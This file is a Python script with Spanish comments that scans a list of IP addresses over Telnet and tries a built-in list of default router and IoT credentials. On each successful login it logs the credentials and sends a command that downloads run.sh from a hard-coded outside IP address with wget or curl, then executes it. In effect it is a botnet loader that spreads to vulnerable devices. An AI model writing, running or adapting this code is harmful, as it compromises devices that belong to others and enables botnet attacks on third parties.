#!/usr/bin/env python3
import threading
import sys
import socket
import time
import queue

if len(sys.argv) < 4:
    print("Usage: python {} <list> <threads> <output file>".format(sys.argv[0]))
    sys.exit(1)

# Lista de combinaciones (usuario:contraseña)
combo = [
    "root:root",
    "root:",
    "admin:admin",
    "support:support",
    "user:user",
    "admin:",
    "admin:password",
    "root:vizxv",
    "root:admin",
    "root:xc3511",
    "root:888888",
    "root:xmhdipc",
    "root:default",
    "root:juantech",
    "root:123456",
    "root:54321",
    "root:12345",
    "root:pass",
    "ubnt:ubnt",
    "root:klv1234",
    "root:Zte521",
    "root:hi3518",
    "root:jvbzd",
    "root:anko",
    "root:zlxx.",
    "root:7ujMko0vizxv",
    "root:7ujMko0admin",
    "root:system",
    "root:ikwb",
    "root:dreambox",
    "root:user",
    "root:realtek",
    "root:00000000",
    "admin:1111111",
    "admin:1234",
    "admin:12345",
    "admin:54321",
    "admin:123456",
    "admin:7ujMko0admin",
    "admin:1234",
    "admin:pass",
    "admin:meinsm",
    "admin:admin1234",
    "root:1111",
    "admin:smcadmin",
    "admin:1111",
    "root:666666",
    "root:password",
    "root:1234",
    "root:klv123",
    "Administrator:admin",
    "service:service",
    "supervisor:supervisor",
    "guest:guest",
    "guest:12345",
    "guest:12345",
    "admin1:password",
    "administrator:1234",
    "666666:666666",
    "888888:888888",
    "tech:tech",
    "mother:fucker"
]

# Comando a enviar tras login exitoso (ajústalo según tu necesidad)
rekdevice = "cd /tmp; (wget -q -T 10 -t 3 -O run.sh http://189.140.120.209/run.sh || busybox wget -q -O run.sh http://189.140.120.209/run.sh || curl -s --connect-timeout 10 --retry 3 -o run.sh http://189.140.120.209/run.sh) && chmod +x run.sh && ./run.sh; rm -f run.sh"

def read_until(sock, needle, timeout=8):
    """Lee datos del socket hasta encontrar 'needle' o agotar tiempo."""
    buf = b''
    start = time.time()
    sock.settimeout(timeout)
    while time.time() - start < timeout:
        try:
            data = sock.recv(1024)
            if not data:
                break
            buf += data
            if needle.encode() in buf:
                return buf.decode('utf-8', errors='ignore')
        except socket.timeout:
            break
        except Exception:
            break
    raise Exception('TIMEOUT')

class RouterThread(threading.Thread):
    def __init__(self, ip, output_file):
        super().__init__()
        self.ip = ip.rstrip('\n')
        self.output_file = output_file

    def run(self):
        username = ""
        password = ""
        for cred in combo:
            # Separar usuario y contraseña
            parts = cred.split(":", 1)
            if len(parts) != 2:
                continue
            username = parts[0]
            password = parts[1]

            # Si la contraseña es vacía, se envía cadena vacía
            # (el código original manejaba "n/a", pero aquí usamos la línea tal cual)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.37)
                sock.connect((self.ip, 23))
            except Exception:
                sock.close()
                break  # No se pudo conectar, pasar a siguiente IP

            try:
                # Esperar prompt de login
                data = read_until(sock, ":", timeout=5)
                sock.send(username.encode() + b"\r\n")
                time.sleep(0.1)
            except Exception:
                sock.close()
                continue

            try:
                data = read_until(sock, ":", timeout=5)
                sock.send(password.encode() + b"\r\n")
                time.sleep(0.1)
            except Exception:
                sock.close()
                continue

            # Esperar shell prompt (# o $)
            try:
                prompt = sock.recv(4096).decode('utf-8', errors='ignore')
                if "#" in prompt or "$" in prompt:
                    success = True
                else:
                    success = False
                    sock.close()
            except Exception:
                sock.close()
                continue

            if success:
                try:
                    sock.send(rekdevice.encode() + b"\r\n")
                    # Registrar éxito
                    with open(self.output_file, "a") as f:
                        f.write(f"{self.ip}:23 {username}:{password}\n")
                    print(f"[+] GOTCHA -> {username}:{password} @ {self.ip}")
                    sock.close()
                    break  # Dejar de probar más credenciales para esta IP
                except Exception:
                    sock.close()
            else:
                sock.close()

def worker(q, output_file):
    while True:
        try:
            ip = q.get(timeout=1)
        except queue.Empty:
            break
        t = RouterThread(ip, output_file)
        t.start()
        q.task_done()
        time.sleep(0.02)  # Pequeña pausa para no saturar

def main():
    # Leer lista de IPs
    with open(sys.argv[1], "r") as f:
        ips = [line.strip() for line in f if line.strip()]

    threads_count = int(sys.argv[2])
    output_file = sys.argv[3]

    q = queue.Queue()
    for ip in ips:
        q.put(ip)

    print(f"[*] {q.qsize()} IPs en cola. Lanzando {threads_count} workers...")
    workers = []
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q, output_file))
        t.start()
        workers.append(t)

    for t in workers:
        t.join()

    print("[*] Proceso terminado.")

if __name__ == "__main__":
    main()